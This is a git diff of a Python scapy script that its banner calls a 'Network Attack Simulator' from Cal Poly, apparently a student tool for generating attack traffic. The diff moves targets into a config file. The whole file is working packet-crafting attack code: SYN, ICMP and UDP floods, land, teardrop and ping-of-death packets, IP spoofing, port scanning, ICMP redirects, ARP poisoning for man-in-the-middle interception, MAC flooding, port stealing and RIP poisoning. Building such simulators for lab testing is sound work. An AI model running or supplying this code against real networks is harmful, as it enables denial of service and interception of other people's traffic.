@@ -3,20 +3,22 @@ from scapy.all import send, sr, IP, ICMP, ARP, RandIP, RandMAC, TCP, UDP, RIP, R
 from scapy.volatile import RandByte
 import fileinput
 import sys
+import config
 
 def neg():
     print("test")
+    print config.targetIPDestination
     return "test"
 
 # Lower Level Runners #
-def IPSweep(ipDestination, payload): 
-    packet = IP(dst=ipDestination) / ICMP() / payload
+def IPSweep(ipDestination): 
+    packet = IP(dst=ipDestination) / ICMP() / config.LONG_PAYLOAD
     return packet
 def PortScan(ipDestination): 
     packet = IP(dst=ipDestination) / TCP(dport=(1,2000), flags="S")
     return packet
 def IPSpoof(ipDestination, ipSource):
-    packet = IP(dst=ipDestination, src=ipSource) / ICMP() / "0123456789"
+    packet = IP(dst=ipDestination, src=ipSource) / ICMP() / config.LONG_PAYLOAD
     return packet
 def SFFlag(ipDestination): 
     packet = IP(dst=ipDestination) / TCP(flags="SF")
@@ -37,7 +39,7 @@ def SYNFlood(ipDestination):
     return packet
 def ICMPFlood(ipDestination):
     #With unspoofed address
-    packet = IP(dst=ipDestination) / ICMP() / "0123456789"
+    packet = IP(dst=ipDestination) / ICMP() / config.LOAD_PAYLOAD
     return packet
 def DropCommunication(ipDestination1, ipDestination2):
     packet1 = IP(dst=ipDestination1) / ICMP(type=3, code=1)
@@ -47,7 +49,7 @@ def ICMPRedirect(victim, attacker):
     packet = IP(dst=victim) / ICMP(type=5, code=1, gw=attacker)
     return packet
 def UDPFlood(ipDestination):
-    packet = IP(dst=ipDestination) / UDP(dport=20) / ("XABCDEFG" * RandByte())
+    packet = IP(dst=ipDestination) / UDP(dport=20) / ( config.LONG_PAYLOAD * RandByte())
     return packet
 def LandAttack(ipDestination):
     packet = IP(dst=ipDestination, src=ipDestination) / TCP(sport=139, dport=139, flags="S")
@@ -62,11 +64,11 @@ def PingOfDeath(ipDestination):
 
 # Man in the Middle Attacks
 def ARPPoisoning():
-    routerIp = "192.168.1.1"
-    routerMac = "00:00:00:00:00:01"
-    victimIp = "192.168.1.17"
-    victimMac = "00:00:00:00:00:02"
-    attackerMac = "00:00:00:00:00:03"
+    routerIp = config.targetIPDestination
+    routerMac = config.ROUTER_MAC
+    victimIp = config.VICTIM_IP
+    victimMac = config.VICTIM_MAC
+    attackerMac = config.ATTACKER_MAC
     packet1 = ARP(op = 2, hwsrc=attackerMac, psrc=victimIp, hwdst=routerMac, pdst=routerIp)
     packet2 = ARP(op = 2, hwsrc=attackerMac, psrc=routerIp, hwdst=victimMac, pdst=victimIp)
     return packet1, packet2
@@ -74,8 +76,8 @@ def MACFlood():
     packet = ARP(op=2, psrc=RandIP(), hwsrc=RandMAC(), pdst=RandIP(), hwdst=RandMAC())
     return packet
 def PortStealing():
-    victimMac = "00:00:00:00:00:02"
-    attackerMac = "00:00:00:00:00:03"
+    victimMac = config.VICTIM_MAC
+    attackerMac = config.ATTACKER_MAC
     packet = ARP(op=2, psrc=RandIP(), hwsrc=victimMac, pdst=RandIP(), hwdst=attackerMac)
     return packet
 def RIPPoisoning():
@@ -84,70 +86,66 @@ def RIPPoisoning():
 
 # Higher Level Runners #
 def RunIPSweep(): 
-    packet=(IPSweep("192.168.1.1", "ABCDEFGH"))
+    packet=IPSweep(config.targetIPDestination)
     print("packet built: " + str(packet))
-    print("hi1")
-    print(0x42)
-    print("hi2")
-    print(str(0x42))
     send(packet, inter=0.005)
-    return "test 5"
+    return "IPSweep"
 def RunPortScan(): 
-    packet = PortScan("192.168.1.1", )
+    packet = PortScan(config.targetIPDestination)
     sr(packet, inter=0.005)
     return "RunPortScan"
 def RunIPSpoof():
-    packet = IPSpoof("192.168.1.1", "192.168.1.117")
+    packet = IPSpoof(config.targetIPDestination, "192.168.1.117")
     send(packet)
     return "IPSpoof"
 def RunSFFlag(): 
-    packet = SFFlag("192.168.1.1")
+    packet = SFFlag(config.targetIPDestination)
     send(packet)
     return "SFFlag"
 def RunFFlag(): 
-    packet = FFlag("192.168.1.1")
+    packet = FFlag(config.targetIPDestination)
     send(packet)
     return "FFlag"
 def RunURGFlag():
-    packet = URGFlag("192.168.1.1")
+    packet = URGFlag(config.targetIPDestination)
     send(packet)
     return "URGFlag"
 def RunNoFlag():
-    packet = NoFlag("192.168.1.1")
+    packet = NoFlag(config.targetIPDestination)
     send(packet)
     return "NoFlag"
 def RunSYNFlood():
-    packet = SYNFlood("192.168.1.1")
+    packet = SYNFlood(config.targetIPDestination)
     send(packet)
     return "SYNFlood"
 def RunICMPFlood():
-    packet = ICMPFlood("192.168.1.1")
+    packet = ICMPFlood(config.targetIPDestination)
     send(packet)
     return "ICMPFlood"
 def RunDropCommunication():
-    packets = DropCommunication("192.168.1.1", "192.168.1.2")
+    packets = DropCommunication(config.targetIPDestination, "192.168.1.2")
     send(packets[0])
     send(packets[1])
     return "DropCommunication"
 def RunICMPRedirect():
-    packet = ICMPRedirect("192.168.1.1", "192.168.1.117")
+    packet = ICMPRedirect(config.targetIPDestination, "192.168.1.117")
     send(packet)
     return "ICMPRedirect"
 def RunUDPFlood():
-    packet = UDPFlood("192.168.1.1")
+    packet = UDPFlood(config.targetIPDestination)
     send(packet)
     return "UDPFlood"
 def RunLandAttack():
-    packet = LandAttack("192.168.1.1")
+    packet = LandAttack(config.targetIPDestination)
     send(packet)
     return "LandAttack"
 def RunTeardropAttack():
-    packets = TeardropAttack("192.168.1.1")
+    packets = TeardropAttack(config.targetIPDestination)
     send(packets[0])
     send(packets[1])
     return "TeardropAttack"
 def RunPingOfDeath():
-    packet = PingOfDeath("192.168.1.1")
+    packet = PingOfDeath(config.targetIPDestination)
     #send(packet)
     print("---Fix PingOfDeath---")
     return "PingOfDeath"
@@ -195,6 +193,10 @@ def runnerHelper():
     "RunMACFlood()",
     "RunPortStealing()",
     "RunRIPPoisoning()" ]
+
+    print("  ---Welcome to the Network Attack Simulator---")
+    print("\t\t*** Cal Poly ***")
+    print("Please enter a command. Targets can be modified in the configuration file.")
     for i in range (0, len(functionTable)):
         print("["+str(i)+"]-"+functionTable[i])
 
